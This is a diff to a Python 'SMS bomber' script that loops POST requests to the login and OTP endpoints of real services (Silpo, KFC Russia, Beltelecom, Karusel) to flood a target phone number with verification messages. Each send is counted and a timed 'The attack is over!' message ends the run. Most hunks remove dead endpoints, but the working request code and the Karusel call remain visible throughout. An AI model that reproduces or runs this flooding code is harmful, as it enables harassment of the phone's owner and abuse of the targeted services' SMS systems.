@@ -411,19 +411,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -817,17 +805,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1100,17 +1078,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1122,17 +1090,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1643,17 +1601,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1665,17 +1613,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -2105,31 +2043,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
@@ -2691,19 +2607,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3098,17 +3002,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3382,17 +3276,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3404,17 +3288,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3926,17 +3800,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3948,17 +3812,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -4392,31 +4246,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
@@ -4965,19 +4797,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5371,17 +5191,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5654,17 +5464,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5676,17 +5476,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -6197,17 +5987,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -6219,17 +5999,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -6659,31 +6429,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
@@ -7245,19 +6993,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7652,17 +7388,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7936,17 +7662,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7958,17 +7674,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -8480,17 +8186,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -8502,17 +8198,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -8946,31 +8632,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
@@ -9519,19 +9183,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -9925,17 +9577,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -10208,17 +9850,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -10230,17 +9862,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -10751,17 +10373,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -10773,17 +10385,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -11213,31 +10815,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
@@ -11808,19 +11388,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -12215,17 +11783,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -12499,17 +12057,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -12521,17 +12069,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -13043,17 +12581,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -13065,17 +12593,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -13509,31 +13027,9 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC Was sent! || Count - ' + str(R))
         except:
             print('[-] Error in sent!')
 
